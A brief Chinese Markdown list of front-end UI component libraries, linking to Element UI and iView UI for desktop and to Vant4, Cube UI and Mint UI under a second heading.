# UI组件库

- PC端

	[Element UI](https://element.eleme.cn/#/zh-CN/component/installation)

	[IView UI](https://www.iviewui.com/view-ui-plus/guide/introduce)

- pc端

	[Vant4](https://vant-contrib.gitee.io/vant/#/zh-CN/)

	[Cube UI](https://didi.github.io/cube-ui/#/zh-CN/docs/quick-start)

	[Mint UI](http://mint-ui.github.io/docs/#/zh-cn2)
